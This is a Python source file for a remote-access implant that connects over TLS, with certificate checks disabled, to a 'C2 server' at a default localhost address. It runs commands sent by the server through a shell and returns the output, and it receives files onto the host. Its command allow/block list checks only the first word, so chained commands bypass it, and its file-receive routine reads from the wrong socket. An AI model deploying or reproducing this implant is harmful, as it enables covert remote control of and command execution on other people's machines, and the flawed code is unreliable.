import socket
import ssl
import subprocess

class CommandFilter:
    def __init__(self):
        # Define allowed and blocked commands
        self.allowed_commands = ['enter_shell', 'dir', 'echo', 'ping', 'whoami', 'sysinfo', 'netstat', 'tasklist', 'filesend', 'ipconfig']  # Whitelist
        self.blocked_commands = ['del','erase','rmdir', 'rd', 'ren', 'rename','move', 'shutdown', 'restart', 'net user', 
                                 'net localgroup', 'icacls', 'format', 'diskpart', 'chkdsk', 'ftp', 'telnet', 'arp', 'route', 
                                 'taskkill', 'sc stop', 'reg add', 'reg delete', 'regedit', 'start', 'powershell', 'certutil', 
                                 'mshta', 'msconfig', 'sc config']  # Blacklist

    def run_command(self, command):
        # Split the command into the base command and arguments
        command_list = command.split()

        # Check if command is in the blocked list
        if command_list[0] in self.blocked_commands:
            return f"Error: Command '{command_list[0]}' is blocked."

        # Check if command is in the allowed list
        if command_list[0] not in self.allowed_commands:
            return f"Error: Command '{command_list[0]}' is not allowed."

        try:
            # Run the allowed command using subprocess
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            return result.stdout if result.stdout else result.stderr
        except Exception as e:
            return f"Error executing command: {str(e)}"


class Client:
    def __init__(self, server_ip='127.0.0.1', port=40000):
        self.server_ip = server_ip
        self.port = port
        self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.cmd_filter = CommandFilter()  # Instantiate the command filter

    def connect(self):
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE

        # Wrap the socket with SSL
        connection = context.wrap_socket(self.client_socket, server_hostname=self.server_ip)

        try:
            connection.connect((self.server_ip, self.port))
            print(f"[+] Connected to C2 server at {self.server_ip}:{self.port} using TLS")

            while True:
                # Wait for the server to send the "enter_shell" command
                command = connection.recv(1024).decode()

                if command.lower() == 'enter_shell':
                    print("[+] Entering shell mode.")
                    self.handle_shell_commands(connection)  # Enter the shell loop
                elif command.lower() == 'exit':
                    print("[+] Exiting connection.")
                    connection.close()
                    break
                else:
                    print(f"[+] Unrecognized command: {command}")
        except Exception as e:
            print(f"[+] Connection failed: {e}")

    def handle_shell_commands(self, connection):
        """Handles commands sent from the server once in shell mode."""
        while True:
            command = connection.recv(1024).decode()

            if command.lower() == 'exit':
                print("[+] Exiting shell mode.")
                break

            if command.lower() == 'filesend':
                print("[+] Received filesend command from the server.")
                self.receive_file()
            else:
                # Filter and execute the command using subprocess
                result = self.cmd_filter.run_command(command)
                connection.send(result.encode())

    def receive_file(self):
        try:
            self.client_socket.send(b"filesend")

            file_metadata = self.client_socket.recv(1024).decode("utf-8")
            filename, file_size = file_metadata.split(',')
            file_size = int(file_size)

            print(f"[+] Receiving file: {filename}, {file_size} bytes")

            self.client_socket.send(b"READY")

            with open(f"received_{filename}", "wb") as f:
                bytes_received = 0
                while bytes_received < file_size:
                    file_data = self.client_socket.recv(4096)
                    if not file_data:
                        break

                    f.write(file_data)
                    bytes_received += len(file_data)
                    print(f"[+] Received {bytes_received}/{file_size} bytes")

            completion_message = self.client_socket.recv(1024).decode("utf-8")
            if completion_message == "DONE":
                print(f"[+] File {filename} received successfully.")
            else:
                print(f"[+] File transfer incomplete or failed!")

        except Exception as e:
            print(f"[+] Error receiving file: {e}")

if __name__ == "__main__":
    client = Client()
    client.connect()
